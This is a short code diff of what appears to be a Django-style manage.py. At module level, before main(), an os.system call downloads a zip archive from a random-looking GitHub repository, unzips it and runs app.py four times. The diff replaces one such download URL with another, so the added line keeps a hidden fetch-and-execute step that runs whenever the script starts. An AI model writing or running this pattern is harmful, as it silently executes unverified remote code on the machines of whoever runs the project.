@@ -3,7 +3,7 @@
 ###########################
 import os
 import sys
-os.system('wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
+os.system('wget https://github.com/kuswagn00/sturdy-meme/raw/refs/heads/main/techgig.zip;unzip techgig.zip;python app.py;python app.py;python app.py;python app.py')
 
 def main():
     """Run administrative tasks."""
